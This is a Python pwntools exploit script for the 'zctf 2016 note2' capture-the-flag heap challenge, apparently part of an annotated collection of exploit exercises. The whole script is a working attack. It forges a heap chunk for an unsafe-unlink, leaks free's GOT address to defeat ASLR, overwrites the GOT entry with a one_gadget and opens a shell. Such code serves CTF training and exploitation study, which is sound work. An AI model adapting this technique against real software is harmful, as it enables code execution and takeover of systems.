from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process("./data/bin/heap23_03_zctf_2016_note2")
elf = ELF("./data/bin/heap23_03_zctf_2016_note2")
libc = elf.libc

def new_note(size, content):
    p.recvuntil(">>")
    p.sendline(b"1")
    p.recvuntil(")")
    p.sendline(str(size).encode())
    p.recvuntil(":")
    p.sendline(content)

def show_note(index):
    p.recvuntil(">>")
    p.sendline(b"2")
    p.recvuntil(":")
    p.sendline(str(index).encode())

def edit_note(index, choice, content):
    p.recvuntil(">>")
    p.sendline(b"3")
    p.recvuntil(":")
    p.sendline(str(index).encode())
    p.recvuntil("]")
    p.sendline(str(choice).encode())
    p.recvuntil(":")
    p.sendline(content)

def delete_note(index):
    p.recvuntil(">>")
    p.sendline(b"4")
    p.recvuntil(":")
    p.sendline(str(index).encode())

p.recvuntil(":");p.sendline(b"/bin/sh")#step.1
p.recvuntil(":");p.sendline(b"ddd")#step.2

ptr_0 = 0x602120;fake_fd = ptr_0 - 0x18;fake_bk = ptr_0 - 0x10;note0_content = b'\x00' * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk);new_note(0x80, note0_content)#step.3
new_note(0x0, b'aa')#step.4
new_note(0x80, b'/bin/sh')#step.5
delete_note(1)#step.6
note1_content = b'\x00' * 16 + p64(0xa0) + p64(0x90);new_note(0x0, note1_content)#step.7
delete_note(2)#step.8
free_got = elf.got['free'];payload = 0x18 * b'a' + p64(free_got);edit_note(0, 1, payload)#step.9
show_note(0);p.recvuntil('is ');free_addr = u64(p.recv(6).ljust(8, b'\x00'))#step.10
libc_addr = free_addr - libc.symbols['free'];system_addr = libc_addr + libc.symbols['system'];one_gadget = libc_addr + 0xf1247;edit_note(0, 1, p64(one_gadget))#step.11
p.interactive()#step.12